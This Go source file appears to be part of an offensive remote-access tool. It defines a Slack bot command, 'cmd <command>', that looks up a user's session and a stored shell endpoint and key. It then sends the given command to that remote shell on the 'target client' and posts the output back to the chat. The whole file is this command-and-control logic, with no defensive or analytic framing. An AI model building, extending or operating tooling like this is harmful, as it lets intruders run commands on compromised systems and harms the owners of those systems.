package bot

import (
	"errors"
	"html"

	"github.com/asaskevich/govalidator"
	"github.com/shomali11/slacker"
)

func (s *botService) cmdExecute() {
	cmd := &slacker.CommandDefinition{
		Description: "Execute command on the target client",
		AuthorizationFunc: func(request slacker.Request) bool {
			return s.authorized(request.Event().User, false)
		},
		Handler: func(request slacker.Request, response slacker.ResponseWriter) {
			agent := request.Event().User
			cmd := request.Param("command")
			if govalidator.IsNull(cmd) {
				s.sendError(errors.New("invalid command, format `cmd <command>`"), request, response, true)
				return
			}

			userInfo, err := s.slack.GetUserInfo(agent)
			if err != nil {
				s.sendError(errors.New("get user information"), request, response, true)
				return
			}

			session, err := s.service.GetSessionByID(userInfo.ID)
			if err != nil && err.Error() == "key not found" {
				s.sendError(errors.New("no active session"), request, response, true)
				return
			} else if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			shellcode, err := s.service.GetShellcodeByKey(session.Key)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			payload, err := s.helper.Payload(shellcode.Endpoint, shellcode.ShellKey, cmd, 10)
			if err != nil {
				s.sendError(err, request, response, true)
				return
			}

			shellResponse := "*Shell:* " + shellcode.ShellKey + "\n*Endpoint:* " + shellcode.Endpoint + "\n*Command:* " + cmd + "\n" + "```" + html.EscapeString(payload) + "```"
			s.sendReply(shellResponse, request, response, true)
		},
	}
	s.slack.Command("cmd <command>", cmd)
}
